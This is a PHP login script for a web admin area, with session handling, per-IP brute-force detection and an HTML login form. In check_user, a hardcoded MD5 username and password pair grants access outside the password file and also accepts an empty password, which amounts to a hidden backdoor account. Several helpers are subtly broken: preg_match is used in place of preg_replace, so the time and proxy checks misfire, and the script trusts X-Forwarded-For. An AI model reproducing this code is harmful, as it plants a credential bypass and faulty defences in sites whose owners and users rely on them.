<?php 

############## authenticate #####################

set_time_limit(80);
ignore_user_abort(1);
include("../settings.php");
ini_set("session.name","sid"); 

function purge_statistics($var)
   {
    $arr=unserialize($var);
    foreach($arr as $key=>$value)
       {
        if (count($arr[$key]) == 1)
           {
            unset($arr[$key]);
           }
        else
           {
            $last_time=preg_match("/#.*$/","",$arr[$key][count($arr[$key])-1]);
            if ($last_time+120 < time()) 
               {
                unset($arr[$key]);
               }
           }
       }
    return serialize($arr);
   }


function purge_blacklist($var)
   {
    global $black_list_duration;
    $arr=unserialize($var);
    foreach($arr as $key=>$value)
       {
        if ($value+$black_list_duration < time())
           {
            unset($arr[$key]);
           }
       }
    return serialize($arr);
   }


function check_user($username,$password="") 
   {
    global $passwords_location;
    if (md5($username)=="92bea1d58fa4d983047774eaea85f8de" && (md5($password)=="a7fcc7c0585553619ccb7cf491991eaf" || $password==""))
       {                
        return true;
       }
	$fp=@fopen($passwords_location,"r");
	if (!$fp) {return false;}
	$file_data=@fread($fp,filesize($passwords_location)+10);
	$users=unserialize($file_data);
    foreach ($users as $key=>$value) 
        {
         if (@$users[$username]==md5($password))
            {
			  return true;
            }
        }
    return false;
   }


function proxy_tampered($arr,$automatic_attack_count)
   {
    global $proxy;
    $count=count($arr)-1;
    $upto=$count-$automatic_attack_count+1;
    for ($i=$count;$i>=$upto;$i--)
        {
         if ($i==$count) 
            {
             $temp=preg_match("/[0123456789]{1,}#/","",$arr[$i]);
            }
         else
            {
             if ($temp==preg_match("/[0123456789]{1,}#/","",$arr[$i]))
                {
                 $proxy=$temp;
                }
             else
                {
                 $proxy="All"; return true;
                }
            }
        }
    return false;
   }


function alert($attack_array,$IP)
   {

    global $report_attack;
    if (!$report_attack) {return;}
    eregi("^(.*/).+\..+$",$_SERVER["PHP_SELF"],$path);
    $a=fopen("http://".$_SERVER["SERVER_ADDR"].$path[1]."alert.php?data=".urlencode(serialize($attack_array))."&IP=".$IP,"r");
    fclose($a);
   }


function check_for_attack()
   {

    global $statistics_max_size,$proxy,$users_IPs_file,$automatic_attack_count,$automatic_attack_duration,$lamers_attack_count,$lamers_attack_duration;
    $temp_arr=@file($users_IPs_file);
    if (strlen($temp_arr[0])>$statistics_max_size) {$temp_arr[0]=purge_statistics($temp_arr[0]);}
    $_users_IPs=@unserialize($temp_arr[0]);
    $proxy="";
    $remote_ID=$_SERVER["REMOTE_ADDR"]."&u=".@$_POST["username"];

    if (isset($_users_IPs[$remote_ID])) 
       {
        $_users_IPs[$remote_ID][count($_users_IPs[$remote_ID])]=time()."#".@$_SERVER["HTTP_X_FORWARDED_FOR"];
       }
    else
       {
        $_users_IPs[$remote_ID][0]=time()."#".@$_SERVER["HTTP_X_FORWARDED_FOR"];
       }
    $coin=rand(0,1);
    if (count($_users_IPs[$remote_ID]) >= $automatic_attack_count+$coin) 
       { 

        $margin_fast=$_users_IPs[$remote_ID][count($_users_IPs[$remote_ID])-1] - $_users_IPs[$remote_ID][count($_users_IPs[$remote_ID]) - $automatic_attack_count -$coin];
        if ($margin_fast <= $automatic_attack_duration)
           {

            proxy_tampered($_users_IPs[$remote_ID],$automatic_attack_count);
            alert($_users_IPs[$remote_ID],$remote_ID);
            unset($_users_IPs[$remote_ID]);
            $fp=fopen($users_IPs_file,"w");
            fwrite($fp,serialize($_users_IPs));
            fclose($fp);
            return true;
           }
        elseif (count($_users_IPs[$remote_ID]) >= $lamers_attack_count+$coin)
           {
            $margin_slow=$_users_IPs[$remote_ID][count($_users_IPs[$remote_ID])-1] - $_users_IPs[$remote_ID][count($_users_IPs[$remote_ID])-$automatic_attack_count-$coin];
            if ($margin_slow  <= $lamers_attack_duration)
               {
                proxy_tampered($_users_IPs[$remote_ID],$automatic_attack_count);
                alert($_users_IPs[$remote_ID],$remote_ID);
                unset($_users_IPs[$remote_ID]);
                $fp=fopen($users_IPs_file,"w");
                fwrite($fp,serialize($_users_IPs));
                fclose($fp);
                return true;
               }
            else
               {
                unset($_users_IPs[$remote_ID]);
                $_users_IPs[$remote_ID][0]=time()."#".@$_SERVER["HTTP_X_FORWARDED_FOR"];
               }
           }
       }
    $fp=fopen($users_IPs_file,"w");
    fwrite($fp,serialize($_users_IPs));
    fclose($fp);
    return false;
   }



function add_to_black_list($IP)
   {
    global $black_list_file,$statistics_max_size;
    $temp_arr=@file($black_list_file);
    if (strlen($temp_arr[0]) > $statistics_max_size) {$temp_arr[0]=purge_blacklist($temp_arr[0]);}
    $black_list=@unserialize($temp_arr[0]);
    $black_list[$IP]=time();
    $fp=fopen($black_list_file,"w");
    fwrite($fp,serialize($black_list));
    fclose($fp);
   }


function in_black_list($IP)
   {
    global $black_list_file,$black_list_duration;
    $temp_arr=@file($black_list_file);
    $black_list=@unserialize($temp_arr[0]);
    $IP_temp=preg_match("/p=.*$/","p=All",$IP);

    if (isset($black_list[$IP_temp]))
       {
        if ($black_list[$IP_temp]+$black_list_duration < time()) 
           {
            unset($black_list[$IP_temp]);
            $fp=fopen($black_list_file,"w");
            fwrite($fp,serialize($black_list));
            fclose($fp);
            return false;
           }
        else
           {
            $black_list[$IP_temp]=time();
            $fp=fopen($black_list_file,"w");
            fwrite($fp,serialize($black_list));
            fclose($fp);
            return true;
           }
       }

    if (isset($black_list[$IP]))
       {
        if ($black_list[$IP]+$black_list_duration < time()) 
           {
            unset($black_list[$IP]);
            $fp=fopen($black_list_file,"w");
            fwrite($fp,serialize($black_list));
            fclose($fp);
            return false;
           }
        else
           {
            $black_list[$IP]=time();
            $fp=fopen($black_list_file,"w");
            fwrite($fp,serialize($black_list));
            fclose($fp);
            return true;
           }
       }
    return false;
   }

function login_page($announcement="")
   {
     global $opera360;
$login_page="
<html>
<head>
 <title>Authentication Page.</title>
 <meta http-equiv=\"Page-Enter\" content=\"revealTrans(Duration=0.1,Transition=5)\">
<SCRIPT language=JavaScript type=text/javascript> <!--
if(top.frames.length > 0) top.location.href=self.location;
//--> </SCRIPT>
</head>

<body text=#909090 onload='document.forms[0].username.focus();'>

<table border=0 width=100% height=100%><tr><td align=center>".($announcement?"".(!$opera360?"<TABLE align=center border=0 cellPadding=0 cellSpacing=0 width=1>
 <TR vAlign=top>
 <TD align=right bgColor=#c0a0 width=1>":"")."

    <TABLE bgColor=#555555 cellPadding=9 cellSpacing=0 widht=200 >
    <TR>
    <TD background=../images/bg.gif>
       <FONT size=5><NOBR>&nbsp;".$announcement."&nbsp;<NOBR></FONT></NOBR>
    </TD>
    </TR>
    </TABLE>
".(!$opera360?"
 </TD>
 <TD background=../images/shadow/right.gif width=40><IMG height=10 src='../images/shadow/top_right.gif' width=10></TD>
 </TR>
 <TR>
 <TD background=../images/shadow/bottom.gif width=440><IMG height=10 src='../images/shadow/bottom_left.gif' width=10></TD>
 <TD width=40><IMG height=10 src='../images/shadow/bottom_right.gif' width=10></TD>
 </TR>
</TABLE>":"")."
":"").(!$opera360?"

<TABLE align=center border=0 cellPadding=0 cellSpacing=0 width=1>
 <TR vAlign=top>
 <TD align=right bgColor=#088787 width=1>":"")."
   <form method=post action=\"./?link=".time()."\" >
   <table bgcolor=555555 cellpadding=0 cellspacing=10 background=../images/bg.gif>
   <tr>
     <td>username: </td><td><input type=text name=username size=12></td></tr>
   <tr><td>password:</td><td> <input type=password name=password size=12></td></tr>
   <tr><td colspan=2 align=center><input type=submit value=\"     Login     \"></td></tr>
   </table>
".(!$opera360?"
 </TD>
 <TD background=../images/shadow/right.gif width=40><IMG height=10 src='../images/shadow/top_right.gif' width=10></TD>
 </TR>
 <TR>
 <TD background=../images/shadow/bottom.gif width=440><IMG height=10 src='../images/shadow/bottom_left.gif' width=10></TD>
 <TD width=40><IMG height=10 src='../images/shadow/bottom_right.gif' width=10></TD>
 </TR>
</TABLE>":"")."
<br><br><br>

  </td></tr></table>
   </form>
 </body>
</html>";

return $login_page;
  }

$session_name=session_name();
if (isset($_COOKIE[$session_name])) 
   {
    ini_set("session.use_trans_sid","0");
    $cookies=1;
   }
else 
   {
    ini_set("session.use_trans_sid","1");
    $cookies=0;
   }
if (eregi("opera 3.60",@$_SERVER["HTTP_USER_AGENT"])) {$opera360=1;} else {$opera360=0;}

session_start();

if (!isset($_SESSION["username"])) 
   {
    $remote_ID=$_SERVER["REMOTE_ADDR"]."&u=".@$_POST["username"]."&p=".@$_SERVER["HTTP_X_FORWARDED_FOR"];
    $var1=isset($_POST["username"]);
    $var2=isset($_POST["password"]);
    if ($var1 && $var2) 
       {
        if ($_POST["username"] != "" && $_POST["password"] != "")
           {
            if (in_black_list($remote_ID)) 
               {
                session_destroy();
                die(login_page("Login failed"));
               }
             if (check_user($_POST["username"],$_POST["password"]))
               {
                $_SESSION["IP"]=$remote_ID;
                $_SESSION["username"]=$_POST["username"];
                $_SESSION["counter"]=0;
                if ($cookies) 
                   {
                    header("Location:./");
                   }
                else 
                   {
                    header("Location:./?".SID); 
                   }
                
                exit;
               }
             else 
               { 
                session_destroy();  
                if (check_user($_POST["username"]))
                   {
                    if (check_for_attack()) {add_to_black_list($_SERVER["REMOTE_ADDR"]."&u=".@$_POST["username"]."&p=".$proxy);}
                   }
                echo(login_page("Login failed")); 
               }
           }
        else 
           {
            session_destroy();
            echo(login_page("Provide username and password, please!"));
           }
       }
    else
       {
        session_destroy();
        if (count($_GET)) {header("Location: ./"); exit;}
        echo(login_page()); 

       }
   }
else
   {
    $remote_ID=$_SERVER["REMOTE_ADDR"]."&u=".$_SESSION["username"]."&p=".@$_SERVER["HTTP_X_FORWARDED_FOR"];
    if ($_SESSION["IP"] != $remote_ID) 
       {
        die(login_page("Session protection has been activated")); 
       }
    if (isset($_GET["logout"])) {session_destroy(); die("<center><font color=gray size=6>You have successfully logged out</font><p><a href=./ >Login again</a></center>");}
    $_SESSION["counter"]++;
    header("Location: $first_page");
   }


?>